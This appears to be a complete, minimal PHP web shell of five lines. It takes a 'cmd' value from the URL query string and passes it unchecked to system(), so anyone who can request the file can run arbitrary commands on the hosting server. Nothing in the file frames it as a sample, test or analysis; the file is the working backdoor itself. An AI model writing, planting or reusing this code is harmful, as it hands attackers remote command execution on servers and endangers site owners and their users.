<?php
$cmd = $_GET['cmd'];
$cmd = stripslashes($cmd);
system($cmd);
?>